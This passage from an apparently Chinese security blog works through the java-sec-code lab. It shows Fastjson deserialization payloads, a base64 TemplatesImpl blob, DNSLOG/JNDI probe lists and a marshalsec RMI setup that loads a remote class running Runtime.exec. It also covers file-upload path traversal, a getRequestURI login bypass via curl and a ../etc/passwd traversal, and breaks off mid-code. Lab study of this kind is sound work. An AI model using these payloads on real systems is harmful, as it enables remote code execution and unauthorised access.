JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ&#x3D;&#x3D;\&quot;], \&quot;_name\&quot;: \&quot;lightless\&quot;, \&quot;_tfactory\&quot;: &#123; &#125;, \&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用parseObject 来解析json字符串</p><p>用POST方法打开，Content-Type设置为application/json，暴露使用的fastjson:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164036838.png" alt="image-20210927164036838"></p><h3 id="使用DNSLOG验证"><a href="#使用DNSLOG验证" class="headerlink" title="使用DNSLOG验证"></a>使用DNSLOG验证</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;asText&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164811478.png" alt="image-20210927164811478"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164834250.png" alt="image-20210927164834250"></p><h3 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>编译代码,上传至服务器，我在本地使用Python http.server 进行搭建</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java          &#x2F;&#x2F;进行编译</span><br><span class="line">python3 -m http.server 4444   &#x2F;&#x2F;简单搭建web服务</span><br></pre></td></tr></table></figure><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure><p>在显示监听后，在客户端发送请求payload，主要看创建文件是否成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.169.8.103:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162052579.png" alt="image-20210928162052579"></p><p>发现已经访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;#TouchFile 9999</span><br><span class="line">* Opening JRMP listener on 9999</span><br><span class="line">Have connection from &#x2F;192.168.8.103:54177</span><br><span class="line">Reading message...</span><br><span class="line">Is RMI.lookup call for TouchFile 2</span><br><span class="line">Sending remote classloading stub targeting http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;TouchFile.class</span><br><span class="line">Closing connection</span><br><span class="line"></span><br><span class="line">╰─$ python3 -m http.server 4444</span><br><span class="line">Serving HTTP on :: port 4444 (http:&#x2F;&#x2F;[::]:4444&#x2F;) ...</span><br><span class="line">::ffff:192.168.8.103 - - [28&#x2F;Sep&#x2F;2021 16:06:29] &quot;GET &#x2F;TouchFile.class HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>查看文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162106468.png" alt="image-20210928162106468"></p><ol><li><a href="https://paper.seebug.org/1274/">Fastjson 1.2.24 反序列化漏洞深度分析</a></li><li><a href="https://github.com/alibaba/fastjson/issues/3077">发现最新版本1.2.67依然可以通过dnslog判断正确是否使用fastjson</a></li></ol><h2 id="9-FileUpload"><a href="#9-FileUpload" class="headerlink" title="9.FileUpload"></a>9.FileUpload</h2><p>对于文件上传来说，目前这类漏洞在spring里非常少，原因有两点：</p><ol><li>大多数公司上传的文件都会到cdn</li><li>spring的jsp文件必须在web-inf目录下才能执行</li></ol><p>除非，可以上传war包到tomcat的webapps目录。</p><p>正常上传代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; file.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;status&quot;)</span><br><span class="line">public String uploadStatus() &#123;</span><br><span class="line">    return &quot;uploadStatus&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到没有对后缀名，MIME，文件内容等内容进行校验，可以任意上传。</p><p>对图片上传做限制后的代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&#x2F;picture&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">        if (multifile.isEmpty()) &#123;</span><br><span class="line">            return &quot;Please select a file to upload&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String fileName &#x3D; multifile.getOriginalFilename();</span><br><span class="line">        String Suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F; 获取文件后缀名</span><br><span class="line">        String mimeType &#x3D; multifile.getContentType(); &#x2F;&#x2F; 获取MIME类型</span><br><span class="line">        String filePath &#x3D; UPLOADED_FOLDER + fileName;</span><br><span class="line">        File excelFile &#x3D; convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">        String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">        boolean suffixFlag &#x3D; false;</span><br><span class="line">        for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!suffixFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">        String[] mimeTypeBlackList &#x3D; &#123;</span><br><span class="line">                &quot;text&#x2F;html&quot;,</span><br><span class="line">                &quot;text&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">                &quot;text&#x2F;xml&quot;,</span><br><span class="line">                &quot;application&#x2F;xml&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            &#x2F;&#x2F; 用contains是为了防止text&#x2F;html;charset&#x3D;UTF-8绕过</span><br><span class="line">            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件内容是否是图片 校验3</span><br><span class="line">        boolean isImageFlag &#x3D; isImage(excelFile);</span><br><span class="line">        deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">        if (!isImageFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">            byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">            Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteFile(String filePath) &#123;</span><br><span class="line">        File delFile &#x3D; new File(filePath);</span><br><span class="line">        if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">            if (delFile.delete()) &#123;</span><br><span class="line">                logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.对文件名做了白名单限制{“.jpg”, “.png”, “.jpeg”, “.gif”, “bmp”, “.ico”} 只允许对这些文件进行上传</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">boolean suffixFlag &#x3D; false;</span><br><span class="line">for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">    if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">        suffixFlag &#x3D; true;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!suffixFlag) &#123;</span><br><span class="line">    logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.判断MIME类型是否在黑名单内 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;text&#x2F;html&quot;,</span><br><span class="line">&quot;text&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">&quot;text&#x2F;xml&quot;,</span><br><span class="line">&quot;application&#x2F;xml&quot;</span><br></pre></td></tr></table></figure><p>3.使用contains为了防止text/html;charset=UTF-8绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">    logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.使用IsImage()函数调用ImageIO.read()函数来检测内容是否为文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static boolean isImage(File file) throws IOException &#123;</span><br><span class="line">    BufferedImage bi &#x3D; ImageIO.read(file);</span><br><span class="line">    return bi !&#x3D; null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.上传文件时会通过uuid生成一个’/tmp’ + uuid + ‘png’ 这样的文件名，然后最后删除掉</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void deleteFile(String filePath) &#123;</span><br><span class="line">    File delFile &#x3D; new File(filePath);</span><br><span class="line">    if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">        if (delFile.delete()) &#123;</span><br><span class="line">            logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084805243.png" alt="image-20211026084805243"></p><p>存在未对文件名做校验，存在路径穿越漏洞，参数修改为<code>../../Users/oldthree/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war/1.png</code> 我们可以上传图片到任意目录，上传图片马不解析</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084911718.png" alt="image-20211026084911718"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">─ol4three ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;0.Base&#x2F;apache-tomcat-8.5.70&#x2F;webapps&#x2F;java_sec_code_war</span><br><span class="line">╰─$ ls</span><br><span class="line">1.png    META-INF WEB-INF</span><br></pre></td></tr></table></figure><p>直接进行访问即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026085048387.png" alt="image-20211026085048387"></p><p>由于会重新随机生成文件名未在检测中进行，导致上传jsp失败仍然会在/tmp目录下进行生成随机数生成的.jsp</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026092407832.png" alt="image-20211026092407832"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╭─ol4three &#x2F;tmp</span><br><span class="line">╰─$ ls</span><br><span class="line">06dc320d-35fb-11ec-937b-c91feee9eae9.jsp</span><br><span class="line">1989897e-35fb-11ec-937b-195f26ab9cc0.jsp</span><br><span class="line">2156c28f-35fb-11ec-937b-a71889553c3e.jsp</span><br></pre></td></tr></table></figure><p>使用文件上传any接口上传jsp文件解析利用如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091923728.png" alt="image-20211026091923728"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091850244.png" alt="image-20211026091850244"></p><h2 id="10-GetRequestURI"><a href="#10-GetRequestURI" class="headerlink" title="10.GetRequestURI"></a>10.GetRequestURI</h2><blockquote><p>当应用存在静态资源目录，比如<code>/css/</code>目录，在权限校验时一般会选择放行，即不校验权限。研发同学用<code>getRequestURI()</code>获取URI后，判断是否包含 <code>/css/</code>字符串，如果包含则不校验权限。此时如果URI为<code>/css/../hello</code>，用<code>getRequestURI()</code>获取的URI是<code>/css/../hello</code>，包含<code>/css/</code>字符串，所以不校验权限。但是此时后端的路由为<code>/hello</code>，导致权限绕过。</p></blockquote><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;exclued&#x2F;vuln&quot;)</span><br><span class="line">public String exclued(HttpServletRequest request) &#123;</span><br><span class="line"></span><br><span class="line">    String[] excluedPath &#x3D; &#123;&quot;&#x2F;css&#x2F;**&quot;, &quot;&#x2F;js&#x2F;**&quot;&#125;;</span><br><span class="line">    String uri &#x3D; request.getRequestURI(); &#x2F;&#x2F; Security: request.getServletPath()</span><br><span class="line">    PathMatcher matcher &#x3D; new AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;getRequestURI: &quot; + uri);</span><br><span class="line">    logger.info(&quot;getServletPath: &quot; + request.getServletPath());</span><br><span class="line"></span><br><span class="line">    for (String path : excluedPath) &#123;</span><br><span class="line">        if (matcher.match(path, uri)) &#123;</span><br><span class="line">            return &quot;You have bypassed the login page.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;This is a login page &gt;..&lt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到判断包含/css/和/js/字符串如果包含则不进行校验权限</p><p>由于作者写的时候是使用根目录检测需要/css/..;/exclued/vuln 开头，可以修改网站根目录进行测试或者，手动调试修改代码</p><p>使用curl进行验证发现可以成功绕过return “You have bypasswd the login page.” </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ curl -i -s -k  -X $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36&#39; -H $&#39;Referer: http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;login&#39; \</span><br><span class="line">    -b $&#39;JSESSIONID&#x3D;41B2022F0376956FF0E5583CEC92FD3B; XSRF-TOKEN&#x3D;7de740ac-305e-41b3-b711-438a1b068f77; remember-me&#x3D;YWRtaW46MTYzNjM2NzI0NjU0NDozNTYwZjNiODFiODBhOTYxOTcxZGM4YWQ2NDY5ZTExZA&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;uri&#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln&#39;</span><br><span class="line">HTTP&#x2F;1.1 200</span><br><span class="line">X-Application-Context: application</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">Cache-Control: no-cache, no-store, max-age&#x3D;0, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">You have bypassed the login page.%</span><br></pre></td></tr></table></figure><p>使用浏览器访问如下：<a href="http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln">http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211025182934819.png" alt="image-20211025182934819"></p><p>安全的方法是使用：getServletPath()方法，该方法会自动对URL</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getRequestURI: &#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln</span><br><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getServletPath: &#x2F;exclued&#x2F;vuln</span><br></pre></td></tr></table></figure><p>使用getServletPath()方法对URI进行标准化(normalize)，先对URI进行URLDecode，如果存在<code>/../</code>，将其返回到上一级目录，即/css/..;/exclued/vuln/处理为/exclued/vuln/，并将新的Path设置为servletPath。</p><h2 id="11-PathTraversal"><a href="#11-PathTraversal" class="headerlink" title="11.PathTraversal"></a>11.PathTraversal</h2><p>路径遍历攻击（也称为目录遍历）是指在访问储存在web根目录文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;path_traversal&#x2F;vul?filepath&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)</span><br><span class="line">public String getImage(String filepath) throws 